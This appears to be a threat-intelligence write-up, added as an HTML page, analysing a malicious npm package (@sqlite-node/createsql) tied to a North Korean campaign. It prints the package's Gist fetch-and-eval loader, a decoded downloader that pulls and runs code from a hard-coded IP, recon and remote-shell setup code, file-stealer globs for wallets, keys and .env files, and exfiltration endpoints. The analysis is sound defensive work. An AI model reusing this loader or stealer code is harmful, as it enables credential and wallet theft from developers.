@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>@sqlite-node/createsql: the DPRK&#39;s npm quota, fulfilled via GitHub Gist - The Atomdrift Project</title>
+  <meta name="description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="@sqlite-node/createsql: the DPRK&#39;s npm quota, fulfilled via GitHub Gist - The Atomdrift Project">
+  <meta property="og:description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>%E2%9A%9B</text></svg>">
+
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift News" href="/feed.xml">
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift Discoveries" href="/discoveries/feed.xml">
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+
+  <div class="site-header">
+    <div class="header-inner">
+      <div class="logo-block">
+        <a href="/">
+          <svg class="atom-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="50" cy="50" r="6" fill="#3b82f6"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(-30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(90 50 50)"/>
+            <circle cx="18" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="82" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="50" cy="88" r="3.5" fill="#d0ff00"/>
+          </svg>
+          <div class="logo-text">
+            <span class="logo-name">atom<span class="logo-accent">drift</span></span>
+            <span class="logo-tagline">Open-source, offline supply-chain attack detection for the AI age</span>
+          </div>
+        </a>
+      </div>
+      <div class="header-links">
+        <a href="https://codeberg.org/atomdrift" target="_blank">Codeberg</a>
+        <a href="https://lab.atomdrift.org/" class="hl" target="_blank">Lab</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="toxic-stripe"></div>
+
+  <div class="nav">
+    <div class="nav-inner">
+      <a href="/">Home</a>
+      <a href="/news/">News</a>
+      <a href="/discoveries/" class="active">Discoveries</a>
+      <a href="/compare/">Compare</a>
+      <a href="/projects/">Projects</a>
+      <a href="/support/">Support</a>
+    </div>
+  </div>
+
+  <main>
+    
+<div class="main-full">
+  <div class="post-header">
+    <h1>@sqlite-node/createsql: the DPRK&#39;s npm quota, fulfilled via GitHub Gist</h1>
+    <span class="post-meta">2026-06-13 &middot; npm &middot; @sqlite-node/createsql</span>
+  </div>
+  <div class="post-body discovery-body">
+    <img src="/assets/images/sqlite-node-createsql-dprk-agitprop.jpg" alt="A North Korean propaganda poster — a worker barks into a radio under a banner reading 'Let's unconditionally fulfill this year's people's economic plan!' — standing in for the Contagious Interview crew making its quota again: a fourth npm sample of the same BeaverTail-to-InvisibleFerret kit, this time delivered from a GitHub Gist." style="width: 60%; height: auto;">
+<p>The package is 707 bytes, and almost none of them are malicious. Its entire <code>index.js</code> fetches one GitHub Gist through the API and evals the response — npm does the fetching, npm does the detonating, and the actual weapon never ships in the tarball. What unrolls from there is the same DPRK Contagious Interview kit this site has now caught four times; the only thing that changed is the wrapper.</p>
+<h2 id="package-metadata" tabindex="-1"><a class="header-anchor" href="#package-metadata"><span>Package metadata</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td><code>@sqlite-node/createsql</code></td>
+</tr>
+<tr>
+<td>Version</td>
+<td><code>1.0.7</code></td>
+</tr>
+<tr>
+<td>Description</td>
+<td><code>A SQLite Tooslkit for node version </code></td>
+</tr>
+<tr>
+<td>Author</td>
+<td><code>anton carlos</code></td>
+</tr>
+<tr>
+<td>License</td>
+<td><code>ISC</code></td>
+</tr>
+<tr>
+<td>Repository</td>
+<td><code>git+https://github.com/guilderguzman/array-utl_nodelump.git</code></td>
+</tr>
+<tr>
+<td>Keywords</td>
+<td><code>node</code>, <code>lamp</code></td>
+</tr>
+<tr>
+<td>Main</td>
+<td><code>index.js</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="stage-1-%E2%80%94-the-gist-dead-drop" tabindex="-1"><a class="header-anchor" href="#stage-1-%E2%80%94-the-gist-dead-drop"><span>Stage 1 — the Gist dead-drop</span></a></h2>
+<p>The loader pulls the Gist's first file from the GitHub API and evals its text, so GitHub is the dead-drop and the operator can swap the payload without ever republishing to npm.</p>
+<pre class="lang-js"><code><span class="tok-com">// index.js — the entire package</span>
+<span class="tok-kw">const</span> gisturl = <span class="tok-str">"https://gist.github.com/metabrainai000/198a0bbec7a6018e9250615d26e37b90.js"</span>;
+<span class="tok-kw">const</span> gistId = gisturl.<span class="tok-fn">split</span>(<span class="tok-str">'/'</span>).<span class="tok-fn">pop</span>().<span class="tok-fn">replace</span>(<span class="tok-str">'.js'</span>, <span class="tok-str">''</span>);
+<span class="tok-kw">const</span> apiTarget = <span class="tok-tmpl">`https://api.github.com/gists/<span class="tok-tmpl-expr">${gistId}</span>`</span>;
+<span class="tok-kw">const</span> response = <span class="tok-kw">await</span> <span class="tok-fn">fetch</span>(apiTarget);
+<span class="tok-kw">const</span> scriptText = (<span class="tok-kw">await</span> response.<span class="tok-fn">json</span>()).files[<span class="tok-comment">/* first */</span>].content;
+<span class="tok-fn">eval</span>(scriptText);
+</code></pre>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>Evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/command-and-control/channel/deaddrop/github</code></td>
+<td>GitHub Gist API content executed with <code>eval</code> [T1102.003, T1059.007]</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/supply-chain/hidden-payload/staging</code></td>
+<td>npm package loads and evals GitHub Gist API content [T1195.002]</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/command-and-control/dropper/delivery/fetch-eval</code></td>
+<td>Fetch remote code and eval in memory [T1059.007]</td>
+</tr>
+</tbody>
+</table>
+<h2 id="stage-2-%E2%80%94-what-the-gist-serves" tabindex="-1"><a class="header-anchor" href="#stage-2-%E2%80%94-what-the-gist-serves"><span>Stage 2 — what the Gist serves</span></a></h2>
+<p>The Gist body is a javascript-obfuscator blob; decoded, it does four things in order. It installs its own HTTP and socket libraries with npm, pulls the next stage from a hard-coded IP, writes it to disk, and runs it with <code>node</code> — the malware uses npm as its own package manager.</p>
+<pre class="lang-js"><code><span class="tok-com">// next-stage-script.js (the Gist) — javascript-obfuscator blob, decoded</span>
+<span class="tok-fn">execSync</span>(<span class="tok-str">'npm install axios socket.io-client --no-save --loglevel silent'</span>, { cwd: <span class="tok-fn">tmpdir</span>(), windowsHide: <span class="tok-kw">true</span> });
+<span class="tok-kw">const</span> { data } = <span class="tok-kw">await</span> axios.<span class="tok-fn">get</span>(<span class="tok-str">'http://144.172.117.57/api/service/9aba3ce72b399b18cb920d6ade09d534'</span>);
+<span class="tok-fn">writeFileSync</span>(<span class="tok-fn">join</span>(<span class="tok-fn">tmpdir</span>(), <span class="tok-str">'0001.dat'</span>), data, { flag: <span class="tok-str">'w+'</span> });
+<span class="tok-fn">execSync</span>(<span class="tok-str">'node 0001.dat'</span>, { cwd: <span class="tok-fn">tmpdir</span>(), windowsHide: <span class="tok-kw">true</span> });
+</code></pre>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>Evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/command-and-control/dropper/execution/network-stage</code></td>
+<td>Obfuscated Node hidden-stage downloader [T1105, T1059.007, T1027]</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/supply-chain/hidden-payload/runtime</code></td>
+<td>Obfuscated Node loader hides staged execution [T1195.002, T1105]</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/anti-static/obfuscation/tools/js-obfuscator</code></td>
+<td>Advanced array-shuffling decoder loop [T1027.002]</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>micro-behaviors/process/create/spawn</code></td>
+<td><code>windowsHide</code> set via expression on the spawn</td>
+</tr>
+</tbody>
+</table>
+<h2 id="stage-3-%E2%80%94-the-fan-out" tabindex="-1"><a class="header-anchor" href="#stage-3-%E2%80%94-the-fan-out"><span>Stage 3 — the fan-out</span></a></h2>
+<p><code>0001.dat</code> is where the 707 bytes finally pay off: it writes and spawns four payloads, none of which ever touched the registry. Together they are a complete InvisibleFerret kit — a node-pty remote shell, a multipart file-stealer, and a clipboard watcher — every packet stamped with the same campaign id the download URL carried. Its glob list reads like a crypto-wallet shopping run — seed-phrase and private-key filename patterns, dotenv files, browser and wallet directories — and the loot is POSTed as multipart form-data to port 7626.</p>
+<table>
+<thead>
+<tr>
+<th>Drop</th>
+<th>Role</th>
+<th>Sink</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>scdata</code></td>
+<td>Recon + control client; POSTs OS/user/home/shell, installs <code>ssh2</code> + <code>node-pty@1.0.0</code> for an interactive remote shell</td>
+<td><code>/api/service/process/&lt;uid&gt;</code>, <code>/api/service/makelog</code></td>
+</tr>
+<tr>
+<td><code>ldata</code></td>
+<td><code>form-data</code> multipart-uploader bundle</td>
+<td><code>144.172.117.57:7626/upload</code></td>
+</tr>
+<tr>
+<td><code>node -e</code> #1</td>
+<td>Recursive file stealer — wallet/seed/private-key/dotenv globs, browser &amp; wallet dirs</td>
+<td><code>144.172.117.57:7626/upload</code></td>
+</tr>
+<tr>
+<td><code>node -e</code> #2</td>
+<td>Clipboard watcher — <code>pbpaste</code> (macOS) / <code>Get-Clipboard</code> (Windows)</td>
+<td><code>/api/service/makelog</code></td>
+</tr>
+</tbody>
+</table>
+<pre class="lang-js"><code><span class="tok-com">// scdata — host recon to the campaign-id endpoint, then a remote-shell toolchain</span>
+axios.<span class="tok-fn">post</span>(<span class="tok-str">'http://144.172.117.57/api/service/process/9aba3ce72b399b18cb920d6ade09d534'</span>, {
+  OS: <span class="tok-str">'Linux'</span>, platform, release, host,
+  userInfo: { uid, gid, username, homedir, shell }, uid, t: <span class="tok-str">'1'</span> });
+<span class="tok-fn">execSync</span>(<span class="tok-str">'npm install socket.io-client ssh2 node-pty@1.0.0 ...'</span>);
+
+<span class="tok-com">// node -e #1 — file-stealer globs, cleartext in the obfuscated string array</span>
+[<span class="tok-str">'*secret phrase*'</span>, <span class="tok-str">'*private key*'</span>, <span class="tok-str">'*.env*'</span>, <span class="tok-str">'*.pdf'</span>, <span class="tok-str">'.ssh'</span>, …]  <span class="tok-com">// → :7626/upload</span>
+</code></pre>
+<p>The on-disk stage-3 file is one obfuscated line, so the four drops above were recovered by running the chain under instrumentation — every fetch, write, and spawn stubbed and logged — not by reading them.</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>Evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/anti-static/obfuscation/payload/data-file</code></td>
+<td>Single-line obfuscated payload contains Node stage runtime [T1027, T1059.007]</td>
+</tr>
+</tbody>
+</table>
+<h2 id="same-kit%2C-new-address" tabindex="-1"><a class="header-anchor" href="#same-kit%2C-new-address"><span>Same kit, new address</span></a></h2>
+<p>Strip the wrapper and this is <a href="/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/">web-dotenv</a>, <a href="/discoveries/2026/05/clx-cookieparser-dependency-twin-beavertail/">clx-cookieparser</a>, and <a href="/discoveries/2026/06/path-internal-util-trojanized-path-remote-eval/">path-internal-util</a> one more time — the same scdata control client, the same makelog exfil path, the same node-pty shell, the same seed-phrase globs, all already pinned to North Korea's Contagious Interview campaign via <a href="https://dprk-research.kmsec.uk/">dprk-research.kmsec.uk</a>. What's new is the address: the C2 is <code>144.172.117.57</code> with an upload port of 7626, off the <a href="http://Tier.Net">Tier.Net</a> 216.126.224.0/22 range every prior sample leaned on, and stage 2 now hides in a public GitHub Gist instead of a jsonkeeper blob. Same operators, same quota — they've just moved the dead-drop onto GitHub and rented a fresh IP to collect.</p>
+<h2 id="indicators" tabindex="-1"><a class="header-anchor" href="#indicators"><span>Indicators</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Indicator</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Tarball SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/1fdd44688b0c659850b1afb6163655e5f7e8ba087fb7638d6a8d4d924e8dd2e0">1fdd44688b0c659850b1afb6163655e5f7e8ba087fb7638d6a8d4d924e8dd2e0</a></td>
+</tr>
+<tr>
+<td><code>index.js</code> SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/1f7b28a203a45563eb516228ba2beda4810887717cc64c49ab8dd5fdcf9458e5">1f7b28a203a45563eb516228ba2beda4810887717cc64c49ab8dd5fdcf9458e5</a></td>
+</tr>
+<tr>
+<td>Stage-2 Gist body SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/6c9787cc8feefde605f56b1acda9476639cdcd4fdf25cef3c380021ad65cfd99">6c9787cc8feefde605f56b1acda9476639cdcd4fdf25cef3c380021ad65cfd99</a></td>
+</tr>
+<tr>
+<td>Stage-3 <code>0001.dat</code> SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/448c74b0598bb0c37d90f93888220a121cf575252617e27ef6be6b71c210078e">448c74b0598bb0c37d90f93888220a121cf575252617e27ef6be6b71c210078e</a></td>
+</tr>
+<tr>
+<td>Gist URL</td>
+<td><code>https://gist.github.com/metabrainai000/198a0bbec7a6018e9250615d26e37b90</code></td>
+</tr>
+<tr>
+<td>Gist API</td>
+<td><code>https://api.github.com/gists/198a0bbec7a6018e9250615d26e37b90</code></td>
+</tr>
+<tr>
+<td>Gist owner</td>
+<td><code>metabrainai000</code></td>
+</tr>
+<tr>
+<td>Stage-2 download</td>
+<td><code>http://144.172.117.57/api/service/9aba3ce72b399b18cb920d6ade09d534</code></td>
+</tr>
+<tr>
+<td>Recon endpoint</td>
+<td><code>http://144.172.117.57/api/service/process/9aba3ce72b399b18cb920d6ade09d534</code></td>
+</tr>
+<tr>
+<td>Log endpoint</td>
+<td><code>http://144.172.117.57/api/service/makelog</code></td>
+</tr>
+<tr>
+<td>File / clipboard exfil</td>
+<td><code>http://144.172.117.57:7626/upload</code></td>
+</tr>
+<tr>
+<td>Campaign id</td>
+<td><code>9aba3ce72b399b18cb920d6ade09d534</code></td>
+</tr>
+<tr>
+<td>Dropped artifacts</td>
+<td><code>0001.dat</code>, <code>scdata</code>, <code>ldata</code>, <code>vhost_ctl</code>, <code>npm-compiler.log</code></td>
+</tr>
+</tbody>
+</table>
+
+  </div>
+  <p style="margin-top: 24px; font-size: 0.8125rem;"><a href="/discoveries/">&larr; All discoveries</a></p>
+</div>
+
+  </main>
+
+  <div class="site-footer">
+    <div class="footer-inner">
+      <span>&copy; 2026 The Atomdrift Project</span>
+    </div>
+  </div>
+
+</body>
+</html>
